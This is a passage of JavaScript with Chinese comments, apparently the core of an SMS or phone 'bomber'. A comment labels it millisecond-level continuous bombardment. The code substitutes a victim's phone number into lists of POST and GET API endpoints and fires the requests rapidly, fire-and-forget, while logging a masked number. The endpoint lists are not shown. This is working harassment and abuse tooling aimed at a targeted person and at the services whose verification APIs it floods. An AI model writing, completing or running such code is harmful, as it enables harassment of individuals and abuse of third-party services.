    // 2. 核心逻辑（真正的毫秒级持续轰炸）
    // =========================================================================

    const apis = [];
    postDicts.forEach(d => {
        apis.push({ url: d.url, method: 'POST', data: d.data, header: d.header || {} });
    });
    getUrls.forEach(url => {
        apis.push({ url, method: 'GET', data: {}, header: {} });
    });

    // 工具函数：日志
    function appendLog(msg, phone) {
        const log = document.getElementById('logArea');
        const now = new Date();
        const time = now.toTimeString().slice(0, 8);
        let hiddenPhone = phone;
        if (phone && phone.length >= 4) {
            hiddenPhone = '****' + phone.slice(-4);
        } else if (phone && phone.length > 0) {
            hiddenPhone = '****';
        }
        const finalMsg = msg.replace(phone, hiddenPhone);
        const entry = `[${time}] ${finalMsg}\n`;
        log.textContent += entry;
        if (log.textContent.length > 5000) {
            log.textContent = log.textContent.slice(2000);
        }
        log.scrollTop = log.scrollHeight;
    }

    // 占位符替换
    function interpolate(str, phone) {
        return str.replace(/\[phone\]/g, phone);
    }

    // 构建请求体
    function buildBody(data, headers) {
        if (typeof data === 'string') return data;
        if (typeof data === 'object') {
            const params = new URLSearchParams();
            for (const [k, v] of Object.entries(data)) {
                params.append(k, v);
            }
            return params.toString();
        }
        return '';
    }

    // 单个请求发送（fire-and-forget，不阻塞）
    function sendRequest(api, phone, onComplete) {
        let url = interpolate(api.url, phone);
        const method = api.method.toUpperCase();
        const headers = { ...api.header };
        let body = null;

        if (method === 'POST') {
            const rawData = typeof api.data === 'string'
                ? interpolate(api.data, phone)
                : api.data;
            body = buildBody(rawData, headers);
            headers['Content-Type'] = 'application/x-www-form-urlencoded';
        } else if (method === 'GET') {
            if (api.data && typeof api.data === 'object') {
                const params = new URLSearchParams(api.data);
                const query = params.toString();
                if (query) url += (url.includes('?') ? '&' : '?') + query;
            }
        }

        fetch(url, {
            method: method,
            headers: headers,
            body: body,
            mode: 'cors',
        })
        .then(res => {
            onComplete(res.status >= 200 && res.status < 300);
